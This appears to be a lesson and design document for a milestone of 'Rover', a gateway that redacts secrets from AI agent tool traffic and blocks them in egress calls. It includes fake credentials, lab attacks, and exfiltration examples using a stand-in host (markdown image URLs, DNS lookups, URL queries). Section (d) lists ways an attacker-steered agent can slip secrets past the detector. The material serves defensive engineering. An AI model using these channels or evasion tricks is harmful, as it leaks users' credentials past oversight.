# M10 · Secrets and data-loss prevention

**Goal:** an agent handles credentials all day without meaning to. It
reads an `.env` to debug a build, a CI log that echoes a token, a config
file with a database password. Until M10 Rover passed those straight to the
model, and with `--log-bodies` into its own audit log. M10 adds **DLP**
(data-loss prevention): secrets in what a server sends back are replaced
with `[REDACTED:<kind>]` before the model sees them, a call that would send
a secret out through an egress tool is blocked, and nothing Rover writes to
disk carries one. Because the log is now redacted, bodies are logged by
default again. Lesson focus: DLP, entropy, why logs leak, exfiltration
channels, and why redaction happens before the model and before the log.

## (a) What was built

- **`internal/dlp`**: `Match{Kind, Start, End, Entropy}`, a `Detector` with
  `Find(text)`, and `Redact(text, matches)`. Kinds, most specific first:
  `private-key-pem`, `aws-access-key` (`AKIA`/`ASIA` + 16), `github-token`
  (`ghp_ gho_ ghs_ ghu_ ghr_` + 36, `github_pat_` + 82), `slack-webhook`,
  `http-auth` (`Authorization: Bearer <token>`, `Basic <base64 user:pass>`),
  `slack-token` (`xoxa- xoxb- xoxp- xoxr-`), `stripe` (`sk_live_ rk_live_`
  + 24), `jwt` (three base64url parts whose header decodes to JSON with
  `"alg"`), `aws-secret` (40 characters near "aws" or "secret", entropy >=
  4.3), `generic-credential` (`password=`, `api_key: "..."`, `"token":
  "..."`, only the value is redacted) and `high-entropy`. Hand-written byte
  scanners, no regexp: about 0.6 ms for 64 KB (budget 2 ms).
- **JSON-aware redaction** (`dlp.RedactJSON`): each JSON string is decoded,
  scanned, redacted and re-encoded on its own, and only its bytes are
  spliced into the line (the M5 trick, now in `internal/jsonedit`). Valid
  JSON in, valid JSON out (fuzzed). In JSON a member name and its value are
  separate strings, so a value under a name like `password`,
  `client_secret` or `X-Api-Key` counts as a credential as a whole.
- **roverd** (`internal/daemon/dlp.go`), in every mode:
  - results and errors: every string of `result` (text blocks,
    `structuredContent`, embedded resources, `resources/read` contents) or
    `error` (message, data), member names included, is redacted **before**
    detection scans it and
    before the agent gets it; adjacent text blocks are also scanned across
    their joint. Verdict `replace`, audit findings `dlp:<kind>`, reason
    `redacted: <kinds>`.
  - `tools/call` to a tool labelled `egress` with a secret in its
    arguments: blocked, `secret_in_egress_args:<kind>`, with the usual
    isError body. A tool that is not egress gets its arguments unchanged.
  - the audit log has a **Redactor** hook (`audit.Logger.SetRedactor`):
    every entry, whoever writes it (decisions, approvals, pins, tamper
    alerts), is redacted before it is hashed. A body DLP cannot read becomes
    `"[REDACTED:unreadable]"`.
  - sampling and elicitation requests a server sends are redacted before
    the client gets them.
  - log lines, learn-mode shapes in `state.db` (a resource URI is not
    recorded at all, M9's rule), approval records and the tool text kept with pins
    for `rover pin list` are redacted too; the pin digest is over the
    original.
- **Bodies on by default.** `rover daemon --no-bodies`, or
  `audit: {bodies: false}` in config.yaml, logs metadata only. (`--log-bodies`
  is still accepted: alone it changes nothing, `--log-bodies=false` is the
  same as `--no-bodies`.)
- **Egress allow-list** template, `policy/templates/egress-allowlist.cedar`,
  and the same rule commented out at the end of the starter `policy.cedar`.
- **Corpus** `testdata/corpus/dlp/`: 41 fake secrets, 47 benign look-alikes,
  `dlp/MIN_COUNTS`; gates recall >= 0.95, false positives <= 0.02 in
  `internal/dlp/corpus_test.go` and in a `dlp` section of `rover eval`.
- **Lab server** `testdata/servers/leaky` (build tag `lab`): echoes its
  input into every channel a result has.

## (b) Design decisions and the attacks they prevent

### 1. What DLP is, and what it is not

Data-loss prevention is any control that stops sensitive data leaving the
place it belongs. Rover's version has two directions. **Inbound** (server
to model) it redacts: the model needs to know *that* `.env` has an
`AWS_SECRET_ACCESS_KEY`, not its value, and anything the model has seen it
can repeat, summarise or pass to the next tool. **Outbound** (model to an
egress tool) it blocks: a credential in an e-mail body or a POST is the
definition of exfiltration. A tool that is *not* egress (write a config
file, run a local command) gets the value unchanged, because it may really
need it and redacting would only break the call; the model wrote that value
itself, so hiding it from the tool protects nothing. Its audit entry is
still redacted. DLP is pattern matching: it finds secrets that *look* like
secrets. A password that is an ordinary word, or a key the attacker
encodes first, gets through (attack 3). That is why the egress allow-list
exists next to it.

### 2. Entropy, the maths

Shannon entropy measures how unpredictable a string is. Count how often
each byte value b occurs in a string of n bytes, c_b times, so its
probability is p_b = c_b / n; then H = −Σ p_b · log2(p_b) bits per byte.
`aaaa` has one symbol with p = 1: H = 0. `abcd` has four symbols at 1/4
each: H = 4 · (1/4 · 2) = 2. A string can never beat log2 of its alphabet or
of its length: hex has 16 symbols, so H <= 4; a 32-byte run has at most 32
distinct bytes, so H <= 5. And a *random* string does not reach that ceiling
either, because with few draws some symbols repeat and others never appear:
for n bytes drawn evenly from k symbols the expected entropy is
E(k, n) = log2(n) − (k/n)·E[c·log2 c], with c ~ Binomial(n, 1/k) the count
of one symbol. For 32 bytes that is about 4.27 with lowercase+digits
(k = 36) and 4.56 with base64 (k = 64); only from about 48 bytes does random
base64 average 4.9 or more (5.81 at 256 bytes). A first version of Rover
used one fixed threshold, 4.5, and so missed most 32-character
lowercase+digit tokens and about a third of 32-character base64 ones; the
verification caught it. Now the threshold is E(k, n) − 0.35 for the run's
own alphabet and length (about 2.5 standard deviations below the mean at 32
bytes), and a run with more than one separator (`/ + _ -`) in eight bytes is
a path or slug, not a token. So: a run of 32 to 512 token bytes
`[A-Za-z0-9+/_-]` at or above its threshold, holding a digit and a letter,
is `high-entropy`, unless its shape says it is public data: hex (hashes,
git ids, UUIDs; hex can reach 4.0, above the lowercase threshold, so this
exclusion is load-bearing), base64 of an image or PDF, an SRI or go.sum
hash, an SSH public key, the body of a certificate or public key, base64 of
a whole certificate (a kubeconfig's `certificate-authority-data`; base64 of
a whole *private key* is decoded and flagged), a Message-ID before `@`, or
anything inside a URL.

### 2b. Member names are strings too

JSON has two kinds of string: values and member names. The first version
redacted only values, so `{"structuredContent":{"AKIA...":"owner"}}` reached
the model and the log unchanged, an egress call carrying a token as an
argument *name* was forwarded, and learn mode stored that name. Every
walker now visits names as well; a redacted name gets the same marker, and
a suffix (`[REDACTED:aws-access-key]#2`) when two names of one object would
otherwise collide, because a JSON object with a duplicate name is exactly
the parser differential Rover refuses everywhere else.

### 2c. Redaction makes text longer

`[REDACTED:generic-credential]` is 29 bytes; the value it replaces can be
8. A 7.8 MB result of `pwd=a1234567 ` became 20 MB once redacted: larger
than the 16 MiB message cap, larger than an audit line may be, so the audit
write failed and roverd, failing closed, blocked everything until restart.
Now a redacted result that would exceed the cap is replaced as a whole by
`[Rover removed content: too many secrets to redact (N matches)]`, and an
audit entry too large for its line keeps the start of its body as a string
with `body_truncated: true` and the whole body's SHA-256. Size can no
longer fail an audit write; a real I/O error still does.

### 3. Why logs leak

A log is a second copy of the data, written by a program whose job is to
remember everything, read later by people and tools who were never meant to
see the secret, backed up, shipped to a log service, pasted into an issue.
An audit log is worse: it is *supposed* to keep message bodies. Until M10
Rover's answer was to not log bodies at all (M1). Now every entry passes
through the Redactor **inside** `audit.Logger.Write`, so no future writer of
the log can forget it, and the redacted entry is what is hashed: the chain
verifies the log as written, and the secret was never in it. The same goes
for roverd's own log lines (an error message can quote a value), learn-mode
shapes (they keep short literal strings, exactly the size of an AWS key id;
the grep test caught this), and approval records.

### 4. Exfiltration channels

Ways data leaves through an agent: an egress tool's arguments (e-mail, HTTP
POST, a Slack message); a **URL** the agent fetches, with the data in the
path or query; a **markdown image** the chat client renders,
`![](https://evil.example/p.png?d=<secret>)`, which loads the URL with no
click (M5 flags these in results); and **DNS**: a lookup of
`<secret>.evil.example` reaches the attacker's name server even when every
HTTP request is blocked. DNS exfiltration is out of Rover's reach: Rover sees
MCP messages, not the packets a tool or the OS resolver sends afterwards,
and any tool that touches the network (or a shell tool running `ping`)
resolves names on its own. That is a job for a network layer (rover-net, an
egress firewall, a DNS resolver that logs). What Rover can do is block the
secret in the arguments and, with the allow-list, the destination.

### 5. Redaction before the model and before the log

Order matters. Redaction runs first in the decision on a result: detection
(M5) then scans the redacted text, the agent receives it, and the audit
body is the line as forwarded. If the log were redacted but the model saw
the original, the model could still repeat the secret into a tool call or a
chat reply; if the model saw the redacted text but the log kept the
original, the log would be the leak. Redacting once, at the gateway,
before either, means there is only one copy of the decision and no copy of
the secret.

### 6. Splicing, not re-encoding

Redaction changes only the JSON strings that held a secret: each is
decoded, redacted and re-encoded, and spliced in at its byte offsets.
Re-encoding the whole message would change other bytes (key order, number
formats, escapes) and break the M1 rule "forward the original bytes". A
result Rover cannot read strictly (duplicate keys, too deep) is replaced
with an error, never forwarded unscanned.

## (c) Exercise it by hand

The lab uses the testauth build (fake dialog) and the leaky lab server.

```bash
umask 077
go build -tags testauth -o /tmp/rover-ta ./cmd/rover
go build -tags lab -o /tmp/leaky ./testdata/servers/leaky
export ROVER_DIR=$(mktemp -d /tmp/rover-m10-XXXX)
/tmp/rover-ta policy init
cat > "$ROVER_DIR/config/policy.cedar" <<'EOF'
@id("list") permit (principal, action == Action::"list_tools", resource);
@id("calls") permit (principal, action == Action::"call_tool", resource);
EOF
cat > "$ROVER_DIR/config/config.yaml" <<'EOF'
mode: enforce
labels:
  leaky: { leak: [reads_untrusted], leak_split: [], fail: [], send: [egress] }
EOF
/tmp/rover-ta --test-auth=allow policy apply
/tmp/rover-ta --test-auth=allow daemon 2>>"$ROVER_DIR/state/roverd.log" &
/tmp/rover-ta wrap --name leaky -- /tmp/leaky
{"jsonrpc":"2.0","id":0,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"demo","version":"0"}}}
{"jsonrpc":"2.0","id":1,"method":"tools/list"}
{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"leak","arguments":{"text":"aws key AKIAEXAMPLE000000001"}}}
```

Id 2 comes back with `aws key [REDACTED:aws-access-key]` in the text
block, the resource and `structuredContent`. Then (Ctrl-D, stop roverd)
`grep -ra AKIAEXAMPLE000000001 "$ROVER_DIR"` finds nothing, `rover log
--verify` says the chain is intact, and the audit entries carry
`"findings":["dlp:aws-access-key"]`. `./bin/rover eval` ends with the `dlp`
table and `dlp gates passed`.

## (d) Three attacks to try against it

### Attack 1: a real-looking key in a result (expect: redacted)

Call `leak` with `{"text":"[default]\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}`
and with a GitHub token `ghp_` + 36 characters. Both come back as
`[REDACTED:aws-secret]` / `[REDACTED:github-token]`; the log has
`redacted: ...`. Try `fail` with `password=hunter2hunter2`: the JSON-RPC
error's message and data are redacted too. (Tests:
`TestSecretsInResponsesAreRedactedBeforeTheAgentAndTheLog`,
`TestNoFixtureSecretReachesRoverDir`.)

### Attack 2: a key in an egress argument (expect: blocked)

```
{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"send","arguments":{"text":"ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"}}}
```

`Blocked by Rover policy (rule none): secret_in_egress_args:github-token.`
The leaky server never sees it. Switch `mode: observe` (apply again): still
blocked, like pins and high detections. Now relabel `send: []` and apply:
the same call is forwarded (not egress), and the audit body shows
`[REDACTED:github-token]`. (Test: `TestSecretInEgressArgsIsBlockedAndElsewhereAllowed`.)

### Attack 3: split a key so no single piece matches (report: mixed)

`leak_split` returns its text cut in half in two adjacent text blocks:
`AKIAEXAMPLE` and `000000001`. Neither half is a key on its own, but roverd
also scans the joint of adjacent blocks (the last and first 4 KB joined),
so both halves come back redacted (`start [REDACTED:aws-access-key]`,
`[REDACTED:aws-access-key] end`). The joint is also scanned with a NUL
between the two sides, and a match from the plain join that crosses the
joint is kept only when neither side of the joint is white space: then the
token really continues across it (`export GITHUB_TOKEN=ghp_a1b2` + `c3d4...`
is caught), while `password=hunter2hunter2` ending in a line break does not
swallow a next block starting `[default]`. (A first fix used a cleverer
rule and lost split tokens after a credential name; the re-verification
caught it.) What still gets through, honestly:
the two halves in two *different* results (two calls), a space or a
lowercase change (`AKIA EXAMPLE000000001`), base64 of a short key (28
characters, under the 32-byte entropy floor), and a random secret inside a
URL query (`https://evil.example/?q=<random>`: URLs are excluded from the
entropy rule because their ids look random; known formats like `ghp_` are
still caught there). An agent being steered by an attacker can do all of
these. That is the limit of pattern matching, and the reason the egress
allow-list template exists: it does not care what the data looks like, only
where it goes.

## (e) Five explain-back questions

1. Why does Rover redact secrets in results but block (not redact) them in
   egress arguments, and leave them alone in a non-egress tool's arguments?
2. A SHA-256 digest looks random. Why can it never reach an entropy of 4.5
   bits per byte, whatever its value?
3. The Redactor sits inside `audit.Logger.Write` rather than in each caller.
   Which kind of bug does that rule out, and why is the redacted entry the
   one that gets hashed?
4. Name three exfiltration channels an agent has, and explain why Rover can
   do nothing about DNS.
5. What would go wrong if Rover re-encoded the whole result after
   redaction instead of splicing only the changed strings?
